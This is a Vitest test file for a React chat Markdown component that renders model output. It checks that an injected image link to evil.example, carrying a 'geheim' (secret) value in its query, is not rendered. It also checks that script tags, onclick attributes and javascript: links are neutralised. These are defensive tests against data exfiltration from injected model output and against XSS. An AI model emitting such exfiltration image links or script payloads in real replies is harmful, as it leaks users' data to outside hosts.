import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { Markdown } from "../src/components/chat/markdown";

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

describe("chat markdown (model output)", () => {
  it("renders no images, so injected image URLs cannot carry data out", () => {
    const html = render("Hier: ![Kundendaten](https://evil.example/x.png?d=geheim)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
    expect(html).toContain("[Kundendaten]");
  });

  it("shows raw HTML only as text and drops javascript: links", () => {
    const html = render('<script>alert(1)</script> <b onclick="x">b</b>');
    expect(html).not.toMatch(/<script/);
    expect(html).not.toMatch(/<b[^>]*onclick/);
    const link = render("[Klick](javascript:alert(1))");
    expect(link).not.toContain('href="javascript:');
  });
});
